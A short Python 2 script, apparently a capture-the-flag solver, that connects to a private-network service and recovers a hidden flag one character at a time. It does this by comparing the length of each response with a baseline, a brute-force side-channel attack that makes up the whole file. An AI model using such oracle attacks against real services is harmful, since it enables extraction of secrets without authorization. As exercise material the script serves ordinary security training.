#!./bin/python

import socket, time


def test(username):
	host = "10.176.67.49"
	port = 5678

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host, port))
	greeting = sock.recv(2048)
	sock.send(username)
	result = sock.recv(1024)
	sock.close()
	return len(result)


flag = "flag="

baseline = test(flag)
print baseline

while (flag[-1] != ' '):

	for i in range(20, 127):

		if test(flag + chr(i)) == baseline:
			flag = flag + chr(i)
			print flag

